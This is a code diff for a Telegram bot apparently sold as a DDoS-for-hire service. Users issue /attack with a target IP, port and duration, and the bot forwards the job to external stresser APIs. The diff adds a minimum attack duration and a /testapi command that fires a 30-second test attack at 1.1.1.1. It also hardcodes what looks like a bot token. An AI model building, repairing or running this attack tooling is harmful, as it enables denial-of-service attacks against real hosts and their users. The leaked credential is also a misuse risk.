@@ -1,14 +1,14 @@
 # ============================================================
-# 🚀 RAILWAY DEPLOYMENT READY BOT — FIXED VERSION
+# 🚀 RAILWAY DEPLOYMENT READY BOT — FINAL FIXED VERSION
 # ============================================================
-# FIXES INCLUDED:
-# 1. Polling timeout fix (60s instead of 30s)
+# FIXES:
+# 1. Polling timeout fix (60s)
 # 2. Session with retry logic
-# 3. Channel check fail-safe (bot admin na ho to skip)
+# 3. Channel check fail-safe
 # 4. Feedback default OFF
-# 5. Better API logging
-# 6. /testapi command for debugging
-# 7. Auto-recovery with consecutive failure counter
+# 5. /testapi duration=30 (Mahakal API min 10-300)
+# 6. Attack handler min duration=10 check
+# 7. Auto-recovery with failure counter
 # ============================================================
 
 import telebot
@@ -34,7 +34,7 @@ sys.stderr.reconfigure(line_buffering=True)
 
 BOT_START_TIME = datetime.now()
 
-# ===== CONFIGURATION (ENV VARIABLES SE) =====
+# ===== CONFIGURATION =====
 BOT_TOKEN = os.environ.get(
     "BOT_TOKEN",
     "8878650472:AAHMz1JD445Ueq58V12-ljFZ0H8GDT6aZs0"
@@ -71,7 +71,7 @@ except Exception as e:
     print(f"❌ MongoDB connection error: {e}", flush=True)
     exit(1)
 
-# ===== CUSTOM SESSION WITH RETRY (Fix for Timeout) =====
+# ===== CUSTOM SESSION WITH RETRY =====
 session = requests.Session()
 retries = Retry(
     total=5,
@@ -123,6 +123,7 @@ DEFAULT_GROUP_MAX_ATTACK_TIME = 60
 DEFAULT_PRIVATE_COOLDOWN = 30
 DEFAULT_GROUP_COOLDOWN = 120
 DEFAULT_CONCURRENT_LIMIT = 5
+API_MIN_DURATION = 10  # 🛠️ Mahakal & god.godstress API minimum 10s
 
 # ===== SETTINGS FUNCTIONS =====
 def get_setting(key, default):
@@ -257,7 +258,7 @@ def is_group_approved(group_id):
     approved = get_approved_groups()
     return group_id in approved
 
-# ===== FEEDBACK TOGGLE (FIXED: default OFF) =====
+# ===== FEEDBACK TOGGLE (default OFF) =====
 def get_feedback_enabled():
     return get_setting('feedback_enabled', False)
 
@@ -361,7 +362,7 @@ def check_banned(message):
         return True
     return False
 
-# ===== CHANNEL JOIN CHECK (FIXED: Fail-safe) =====
+# ===== CHANNEL JOIN CHECK (Fail-safe) =====
 def check_channel_join(message):
     if not get_channel_required():
         return True
@@ -375,8 +376,7 @@ def check_channel_join(message):
             if chat_member.status not in ['member', 'administrator', 'creator']:
                 not_joined.append(f"@{channel_username}")
         except Exception as e:
-            # 🛠️ FIX: agar bot channel check nahi kar sakta, to skip karo (block mat karo)
-            print(f"⚠️ Channel check error for {channel_username}: {e} — SKIPPING (fail-safe)", flush=True)
+            print(f"⚠️ Channel check error for {channel_username}: {e} — SKIPPING", flush=True)
             continue
     if not_joined:
         channels_text = "\n".join([f"• {ch}" for ch in not_joined])
@@ -543,11 +543,6 @@ def get_user_cooldown(user_id, is_group=False):
             return 0
         return int(remaining)
 
-def set_user_cooldown(user_id, is_group=False):
-    with _attack_lock:
-        cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
-        user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time)
-
 def get_active_attack_count():
     with _attack_lock:
         now = datetime.now()
@@ -568,9 +563,6 @@ def user_has_active_attack(user_id):
             if attack.get('user_id') == user_id:
                 return True
         return False
-
-def get_max_concurrent():
-    return len(API_LIST)
 
 def get_free_api_index():
     with _attack_lock:
@@ -642,15 +634,15 @@ def track_bot_user(user_id, username=None):
     except:
         pass
 
-# ===== API CALLER (FIXED: Better logging) =====
+# ===== API CALLER =====
 def _call_single_api(slot_index, url, target, port, duration):
     try:
         response = requests.get(url, timeout=15)
         print(f"✅ [API Slot {slot_index+1}] {target}:{port} | Status: {response.status_code} | Response: {response.text[:200]}", flush=True)
     except requests.exceptions.Timeout:
-        print(f"⏰ [API Slot {slot_index+1}] TIMEOUT for {target}:{port} — API slow/dead!", flush=True)
+        print(f"⏰ [API Slot {slot_index+1}] TIMEOUT for {target}:{port}", flush=True)
     except requests.exceptions.ConnectionError:
-        print(f"❌ [API Slot {slot_index+1}] CONNECTION FAILED for {target}:{port} — URL check karo!", flush=True)
+        print(f"❌ [API Slot {slot_index+1}] CONNECTION FAILED for {target}:{port}", flush=True)
     except Exception as e:
         print(f"❌ [API Slot {slot_index+1}] Error: {e}", flush=True)
 
@@ -699,7 +691,7 @@ def generate_global_status_ui():
     footer = "━━━━━━━━━━━━━━━━━━━━"
     return header + body + footer
 
-# ===== START ATTACK FUNCTION =====
+# ===== START ATTACK =====
 def start_attack(target, port, duration, message, attack_id, api_index, is_group=False):
     try:
         user_id = message.from_user.id
@@ -708,7 +700,6 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
         if not is_owner(user_id) and get_feedback_enabled():
             set_pending_feedback(user_id, target, port, duration)
         cooldown_time = get_group_cooldown() if is_group else get_private_cooldown()
-        method = "UDP-BIG"
         attack_start_msg = generate_attack_start_ui(target, port, duration, user_id)
 
         try:
@@ -751,9 +742,6 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
                 del active_attacks[attack_id]
             if attack_id in api_in_use:
                 del api_in_use[attack_id]
-            remaining_cooldown = 0
-            if user_id in user_cooldowns:
-                remaining_cooldown = max(0, int((user_cooldowns[user_id] - datetime.now()).total_seconds()))
         complete_msg = generate_attack_complete_ui(target, port, duration)
         if is_owner(user_id):
             bot.reply_to(message, f"👑 Owner Complete\n{complete_msg}")
@@ -770,7 +758,6 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
 # ===== BOT COMMANDS =====
 # ============================================================
 
-# ===== REEL MANAGEMENT =====
 @bot.message_handler(commands=['reel_on'])
 def reel_on_command(message):
     if not is_owner(message.from_user.id):
@@ -843,19 +830,21 @@ def list_reels_command(message):
     response += f"\nTotal: {len(reels)} reels"
     bot.reply_to(message, response, parse_mode="Markdown")
 
-# ===== TEST API (NEW - Debug command) =====
+# ===== 🛠️ FIXED /testapi — duration=30 =====
 @bot.message_handler(commands=["testapi"])
 def test_api_command(message):
     if not is_owner(message.from_user.id):
         bot.reply_to(message, "❌ Owner only!")
         return
-    bot.reply_to(message, "🧪 Testing all APIs... (wait 15 sec)")
+    bot.reply_to(message, "🧪 Testing all APIs... (wait 20 sec)")
     results = []
     for i, api_url in enumerate(API_LIST):
-        url = api_url.format(ip="1.1.1.1", port="80", duration="5")
+        # 🛠️ FIX: duration=30 (API min 10, max 300)
+        url = api_url.format(ip="1.1.1.1", port="80", duration="30")
         try:
-            r = requests.get(url, timeout=12)
-            results.append(f"✅ Slot {i+1}: HTTP {r.status_code}\n   → {r.text[:100]}")
+            r = requests.get(url, timeout=15)
+            resp_text = r.text[:200].replace('\n', ' ')
+            results.append(f"✅ Slot {i+1}: HTTP {r.status_code}\n   → {resp_text}")
         except requests.exceptions.Timeout:
             results.append(f"⏰ Slot {i+1}: TIMEOUT (API dead/slow)")
         except requests.exceptions.ConnectionError:
@@ -2166,7 +2155,7 @@ def feedback_off_command(message):
     bot.reply_to(message, "✅ Feedback OFF!")
 
 # ============================================================
-# ===== ATTACK - MAIN =====
+# ===== ATTACK - MAIN (with min duration check) =====
 # ============================================================
 @bot.message_handler(commands=["attack"])
 def handle_attack(message):
@@ -2228,9 +2217,13 @@ def handle_attack(message):
     try:
         port = int(port)
         if port < 1 or port > 65535:
-            bot.reply_to(message, "❌ Invalid port!")
+            bot.reply_to(message, "❌ Invalid port! (1-65535)")
             return
         duration = int(duration)
+        # 🛠️ FIX: API minimum 10 seconds
+        if duration < API_MIN_DURATION:
+            bot.reply_to(message, f"❌ Minimum duration: {API_MIN_DURATION} seconds")
+            return
         if is_group:
             max_time = get_group_max_attack_time()
             cooldown_time = get_group_cooldown()
@@ -2287,6 +2280,7 @@ def show_help(message):
 🔧 MAINTENANCE: /maintenance, /ok
 
 🔢 Max Concurrent: 5
+⏱️ Min Duration: 10s
 '''
     elif is_reseller(user_id):
         help_text = '''
@@ -2297,11 +2291,12 @@ def show_help(message):
 🔑 /gen <duration> <count>
 ⚡ /redeem, /attack, /status, /mykey
 🔢 Max Concurrent: 5
+⏱️ Min Duration: 10s
 '''
     else:
         help_text = '''🔐 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥
 
-• /attack <ip> <port> <time> – ⚡ Launch attack
+• /attack <ip> <port> <time> – ⚡ Launch attack (min 10s)
 • /status – 📊 Live progress
 • /mykey – 📦 Plan details
 • /redeem <key> – 🔑 Activate
@@ -2648,6 +2643,7 @@ def welcome_start(message):
 🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
 📢 Channel: {'✅' if get_channel_required() else '❌'}
 🔢 Max Slots: 5
+⏱️ Min Duration: 10s
 🎬 Reel: {'ON' if get_reel_enabled() else 'OFF'}
 📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
 
@@ -2662,7 +2658,7 @@ Use /help for commands.'''
 👑 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁
 
 🔥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥 :
-• /attack <ip> <port> <time>
+• /attack <ip> <port> <time> (min 10s)
 • /status
 • /mykey
 • /redeem <key>
@@ -2741,7 +2737,7 @@ load_saved_channels()
 protection.enabled = get_ddos_protection()
 
 # ============================================================
-# ===== STARTUP PRINT =====
+# ===== STARTUP =====
 # ============================================================
 print("🔥 OGGY BHAI BOT STARTING...")
 print(f"🌐 API: god.godstress.site + mahakalddos.duckdns.org")
@@ -2753,12 +2749,13 @@ print(f"⚡ Group Max: {get_group_max_attack_time()}s")
 print(f"⏳ Private Cooldown: {get_private_cooldown()}s")
 print(f"⏳ Group Cooldown: {get_group_cooldown()}s")
 print(f"🔢 Max Slots: 5")
+print(f"⏱️ Min Duration: {API_MIN_DURATION}s")
 print(f"🎬 Reel: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())})")
 print(f"📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}")
 print("=" * 50)
 
 # ============================================================
-# ===== FIXED POLLING LOOP (TIMEOUT FIX) =====
+# ===== POLLING LOOP (TIMEOUT FIX) =====
 # ============================================================
 logging.getLogger('telebot').setLevel(logging.ERROR)
 logging.getLogger('urllib3').setLevel(logging.ERROR)
@@ -2778,7 +2775,7 @@ while True:
             long_polling_timeout=60,
             allowed_updates=None
         )
-        consecutive_failures = 0  # success → reset
+        consecutive_failures = 0
     except requests.exceptions.ReadTimeout as e:
         consecutive_failures += 1
         print(f"⏰ Read timeout #{consecutive_failures}: {e}", flush=True)
